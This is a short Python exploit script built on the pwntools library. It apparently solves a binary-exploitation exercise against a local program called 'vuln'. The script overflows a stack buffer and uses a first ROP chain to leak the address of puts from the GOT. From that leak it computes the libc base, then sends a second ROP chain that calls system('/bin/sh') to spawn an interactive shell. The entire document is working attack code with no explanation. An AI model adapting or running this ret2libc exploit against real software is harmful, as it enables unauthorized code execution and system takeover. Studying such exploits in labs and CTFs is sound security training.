from pwn import *

context(os = 'linux', arch ='amd64')

r = process("./vuln")

binary = ELF("./vuln")
rop = ROP(binary)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.29.so")


junk = "A" * 136

rop.puts(binary.got['puts'])
rop.call(binary.symbols['main'])

log.info("Stage I ROP Chain:\n" + rop.dump())

stageI = junk + str(rop)
r.recvline()
r.sendline(stageI)
r.recvline()

leaked_puts = r.recvline()[:8].strip().ljust(8,"\x00")
log.success("Leaked puts@GLIBCL: "+str(leaked_puts))
leaked_puts = u64(leaked_puts)

libc.address = leaked_puts - libc.symbol['puts']
rop2 = ROP(libc)
rop2.system(next(libc.search('/bin/sh\x00')))
log.info("Stage II ROP Chain:\n" + rop2.dump())

stageII = junk + str(rop2)
r.recvline()
r.sendline(stageII)
r.recvline()

r.interactive()
